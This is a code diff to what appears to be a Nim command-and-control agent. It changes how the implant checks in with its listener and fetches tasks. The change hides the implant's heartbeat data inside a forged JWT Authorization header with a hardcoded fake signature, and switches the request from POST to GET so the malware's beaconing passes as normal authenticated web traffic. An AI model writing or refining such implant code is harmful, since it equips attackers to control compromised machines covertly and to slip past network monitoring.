@@ -1,4 +1,4 @@
-import httpclient, json, strformat, asyncdispatch
+import httpclient, json, strformat, strutils, asyncdispatch, base64
 
 import ../../common/[types, utils]
 
@@ -35,16 +35,15 @@ proc getTasks*(config: AgentConfig, checkinData: seq[byte]): string =
     var responseBody = ""
 
     # Define HTTP headers
+    # The heartbeat data is placed within a JWT token as the payload (Base64URL-encoded)
+    let payload = encode(checkinData, safe = true).replace("=", "")
     client.headers = newHttpHeaders({ 
-        "Content-Type": "application/octet-stream",
-        "Content-Length": $checkinData.len
+        "Authorization": fmt"Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.{payload}.KMUFsIDTnFmyG3nMiGM6H9FNFUROf3wh7SmqJp-QV30"
     })
-
-    let body = checkinData.toString()
 
     try:
         # Retrieve binary task data from listener and convert it to seq[bytes] for deserialization 
-        responseBody = waitFor client.postContent(fmt"http://{config.ip}:{$config.port}/tasks", body)
+        responseBody = waitFor client.getContent(fmt"http://{config.ip}:{$config.port}/tasks")
         return responseBody
     
     except CatchableError as err:
